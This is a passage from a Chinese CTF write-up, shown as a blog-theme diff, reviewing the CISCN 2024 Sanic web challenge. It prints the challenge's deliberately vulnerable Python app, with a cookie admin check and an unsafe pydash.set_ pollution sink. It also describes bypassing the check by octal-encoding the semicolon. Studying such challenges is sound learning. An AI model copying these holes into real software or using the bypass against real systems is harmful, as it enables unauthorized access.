@@ -1,357 +1,164 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/douni.jpg">
-  <link rel="icon" href="/img/douni.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="fault_li">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="[!NOTE] 一些小小的碎碎念第一次看到sanic其实是不知所措的，感觉这个虽然是眼熟，但也仅限于眼熟，显而易见的，国赛没有做出来，也因为一些心态问题没有做复盘，时隔近两月，慢慢调整好心态后终于是借着gxn师傅的Sanic revenge进行了整体的复盘  这里放上gxn师傅的博客 12https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gxngxngxn&#x2F;p&#x2F;18205235https:&#x2F;&#x2F;ww">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘">
-<meta property="og:url" content="http://example.com/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&&ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/index.html">
-<meta property="og:site_name" content="fault&#96;s blog">
-<meta property="og:description" content="[!NOTE] 一些小小的碎碎念第一次看到sanic其实是不知所措的，感觉这个虽然是眼熟，但也仅限于眼熟，显而易见的，国赛没有做出来，也因为一些心态问题没有做复盘，时隔近两月，慢慢调整好心态后终于是借着gxn师傅的Sanic revenge进行了整体的复盘  这里放上gxn师傅的博客 12https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gxngxngxn&#x2F;p&#x2F;18205235https:&#x2F;&#x2F;ww">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722192644.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722194244.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722194334.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722194622.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722200202.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722200334.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722203749.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722203956.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722204924.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722205432.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722211223.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722212224.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722212210.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722212909.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722215443.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722220557.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722232106.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240722234752.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240723000019.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240723000458.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240723004441.png">
-<meta property="article:published_time" content="2024-07-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-07-22T17:46:35.903Z">
-<meta property="article:author" content="fault_li">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="比赛wp">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240722192644.png">
-  
-  
-  
-  <title>DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘 - fault`s blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 7.2.0"></head>
-
-
-<body>
-  
-
-  <header>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘 | fault`s blog</title><noscript>开启JavaScript才能访问本站哦~</noscript><link rel="icon" href="/img/bitbug_favicon.ico"><!-- index.css--><link rel="stylesheet" href="/css/index.css?v=2.0.4"><!-- inject head--><link rel="canonical" href="http://example.com/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"><!-- aplayer--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.css"><!-- swiper--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.css"><!-- fancybox ui--><!-- katex--><!-- Open Graph--><meta name="description" content="[!NOTE] 一些小小的碎碎念第一次看到sanic其实是不知所措的，感觉这个虽然是眼熟，但也仅限于眼熟，显而易见的，国赛没有做出来，也因为一些心态问题没有做复盘，时隔近两月，慢慢调整好心态后终于是借着gxn师傅的Sanic revenge进行了整体的复盘 这里放上gxn师傅的博客 12http"><!-- pwa--><meta name="apple-mobile-web-app-capable" content="fault`s blog"><meta name="theme-color" content="var(--efu-main)"><meta name="apple-mobile-web-app-status-bar-style" content="var(--efu-main)"><link rel="bookmark" href="/img/bitbug_favicon.ico"><link rel="apple-touch-icon" href="/img/bitbug_favicon.ico" sizes="180x180"><script>console.log(' %c Solitude %c ' + '2.0.4' + ' %c https://github.com/everfu/hexo-theme-solitude',
+    'background:#35495e ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff',
+    'background:#ff9a9a ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff',
+    'background:unset ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff')
+</script><script>(()=>{
+        const saveToLocal = {
+            set: function setWithExpiry(key, value, ttl) {
+                if (ttl === 0)
+                    return
+                const now = new Date()
+                const expiryDay = ttl * 86400000
+                const item = {
+                    value: value,
+                    expiry: now.getTime() + expiryDay
+                }
+                localStorage.setItem(key, JSON.stringify(item))
+            },
+            get: function getWithExpiry(key) {
+                const itemStr = localStorage.getItem(key)
     
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>fault`s blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
+                if (!itemStr) {
+                    return undefined
+                }
+                const item = JSON.parse(itemStr)
+                const now = new Date()
     
+                if (now.getTime() > item.expiry) {
+                    localStorage.removeItem(key)
+                    return undefined
+                }
+                return item.value
+            }
+        };
+        window.utils = {
+            saveToLocal: saveToLocal,
+            getCSS: (url, id = false) => new Promise((resolve, reject) => {
+              const link = document.createElement('link')
+              link.rel = 'stylesheet'
+              link.href = url
+              if (id) link.id = id
+              link.onerror = reject
+              link.onload = link.onreadystatechange = function() {
+                const loadState = this.readyState
+                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+                link.onload = link.onreadystatechange = null
+                resolve()
+              }
+              document.head.appendChild(link)
+            }),
+            getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+              const script = document.createElement('script')
+              script.src = url
+              script.async = true
+              script.onerror = reject
+              script.onload = script.onreadystatechange = function() {
+                const loadState = this.readyState
+                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+                script.onload = script.onreadystatechange = null
+                resolve()
+              }
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-23 00:00" pubdate>
-          2024年7月23日 凌晨
-        </time>
-      </span>
+              Object.keys(attr).forEach(key => {
+                script.setAttribute(key, attr[key])
+              })
     
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
+              document.head.appendChild(script)
+            }),
+            addGlobalFn: (key, fn, name = false, parent = window) => {
+                const globalFn = parent.globalFn || {}
+                const keyObj = globalFn[key] || {}
         
-          3.3k 字
+                if (name && keyObj[name]) return
         
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          28 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <blockquote>
+                name = name || Object.keys(keyObj).length
+                keyObj[name] = fn
+                globalFn[key] = keyObj
+                parent.globalFn = globalFn
+            },
+        }
+    })()</script><!-- global head--><script>const GLOBAL_CONFIG = {
+    root: '/',
+    algolia: undefined,
+    localsearch: undefined,
+    runtime: '2023-04-20 00:00:00',
+    lazyload: {
+        enable: true,
+        error: '/img/error_load.avif'
+    },
+    copyright: {"limit":50,"author":"作者: fault_li","link":"链接: ","source":"来源: fault`s blog","info":"著作权归作者所有。 商业转载请联系作者获得授权，非商业转载请注明出处。"},
+    highlight: {"limit":200,"expand":true,"copy":true,"syntax":"highlight.js"},
+    randomlink: false,
+    lang: {"theme":{"dark":"已切换至深色模式","light":"已切换至浅色模式"},"copy":{"success":"复制成功","error":"复制失败"},"backtop":"返回顶部","time":{"day":"天前","hour":"小时前","just":"刚刚","min":"分钟前","month":"个月前"},"day":" 天","f12":"开发者模式已打开，请遵循GPL协议。","totalk":"无需删除空行，直接输入评论即可"},
+    aside: {
+        sayhello: {
+            morning: "✨ 美好的一天开启啦",
+            noon: "吃得香才能吃得香（确信）",
+            afternoon: "是fault的午睡和游戏时间~",
+            night: "努力学习ing...",
+            goodnight: "碎觉碎觉 😴",
+        },
+        sayhello2: [],
+        sayhello3: {
+            prefix: '好久不见，',
+            back: '欢迎再次回来，',
+        },
+    },
+    covercolor: {
+        enable: false
+    },
+    comment: false,
+    lightbox: 'null',
+    post_ai: false,
+    right_menu: false,
+    lure: false,
+    expire: false,
+};</script><!-- page-config head--><script id="config-diff">var PAGE_CONFIG = {
+    is_post: true,
+    is_page: false,
+    is_home: false,
+    page: '',
+    toc: false,
+    comment: false,
+    ai_text: false
+}</script><meta name="generator" content="Hexo 7.2.0"></head><body id="body"><!-- universe--><canvas id="universe"></canvas><!-- background img--><!-- loading--><!-- console--><!-- sidebar--><div id="sidebar" style="zoom: 1;"><div id="menu-mask" style="display: none;"></div><div id="sidebar-menus"><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><span class="darkmode_switchbutton menu-child" onclick="sco.switchDarkMode()"><i class="solitude fa-solid fa-circle-half-stroke"></i><span>显示模式</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Article</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Friends</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/moments/"><i class="solitude  fas fa-wifi"></i><span>Moments</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>Links</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>Treasure</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Myself</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-laptop"></i><span>Equipment</span></a></li><li><a class="site-page child" href="/tlink/"><i class="solitude  fas fa-toolbox"></i><span>Toobox</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><span>About</span></a></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-widget card-tags card-archives card-webinfo card-allinfo"><div class="card-tag-cloud"><a href="/tags/%E6%80%BB%E7%BB%93/">总结<sup>1</sup></a><a href="/tags/Java%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5/">Java各种注入<sup>1</sup></a><a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/">域相关<sup>2</sup></a><a href="/tags/Java/">Java<sup>8</sup></a><a href="/tags/IOT/">IOT<sup>1</sup></a><a href="/tags/Web/">Web<sup>1</sup></a><a href="/tags/%E6%AF%94%E8%B5%9Bwp/">比赛wp<sup>1</sup></a><a href="/tags/Crypto/">Crypto<sup>2</sup></a></div></div></div></div><!-- keyboard--><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav class="show" id="nav"><div id="nav-group"><div id="blog_name"><a id="site-name" href="/" title="返回博客主页"><span class="title">fault# Solitude / fas fa-ghost / /img/pwa/favicon.ico</span><i class="solitude fa-solid fa-home"></i></a></div><div id="page-name-mask"><div id="page-name"><a id="page-name-text" onclick="sco.toTop()">DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Article</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Friends</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/moments/"><i class="solitude  fas fa-wifi"></i><span>Moments</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>Links</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>Treasure</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Myself</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-laptop"></i><span>Equipment</span></a></li><li><a class="site-page child" href="/tlink/"><i class="solitude  fas fa-toolbox"></i><span>Toobox</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><span>About</span></a></div></div></div><div id="nav-left"></div><div id="nav-right"><div class="nav-button" id="nav-totop" onclick="sco.toTop()"><a class="totopbtn"><i class="solitude fa-solid fa-arrow-up"></i><span id="percent">0</span></a></div><div id="toggle-menu"><a class="site-page"><i class="solitude fa-solid fa-bars"></i></a></div></div></div></nav><div class="coverdiv" id="coverdiv"><img class="nolazyload" id="post-cover" src="/" alt="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘"></div><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original" title="该文章为原创文章，注意版权协议">原创</a><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/"><span class="tags-name tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>Web</span></a><a class="post-meta__tags" href="/tags/%E6%AF%94%E8%B5%9Bwp/"><span class="tags-name tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>比赛wp</span></a></div></div></div></div><h1 class="post-title">DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘</h1><div id="post-meta"><div class="meta-secondline"></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
 <p>[!NOTE] 一些小小的碎碎念<br>第一次看到sanic其实是不知所措的，感觉这个虽然是眼熟，但也仅限于眼熟，显而易见的，国赛没有做出来，也因为一些心态问题没有做复盘，时隔近两月，慢慢调整好心态后终于是借着gxn师傅的Sanic revenge进行了整体的复盘</p>
 </blockquote>
 <p>这里放上gxn师傅的博客</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://www.cnblogs.com/gxngxngxn/p/18205235<br>https://www.cnblogs.com/gxngxngxn/p/18290489<br></code></pre></td></tr></table></figure>
 <h2 id="ciscn2024-sanic"><a href="#ciscn2024-sanic" class="headerlink" title="ciscn2024 sanic"></a>ciscn2024 sanic</h2><p>源码如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br>Session(app)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    user = request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">if</span> user.lower() == <span class="hljs-string">&#x27;adm;n&#x27;</span>:<br>        request.ctx.session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login success&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login fail&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.ctx.session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-literal">True</span>:<br>        key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>        value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>            pollute = Pollute()<br>            pydash.set_(pollute, key, value)<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
-<p>这里我卡住的第一个点就是对于adm;n的校验（国赛我就卡在了这里）因为这个是cookie，而我们又知道cookie的分隔符就是;，那么这里我们需要利用RFC2068 的编码规则，对;进行八进制转化，也就是转化为<code>adm\073n</code>就可以了<br>我们先尝试一下<br><img src="/images/Pasted%20image%2020240722192644.png" srcset="/img/loading.gif" lazyload><br>我们发现可以成功绕过，于是继续往下走，去污染，发现源码在这里过滤了_.的组合</p>
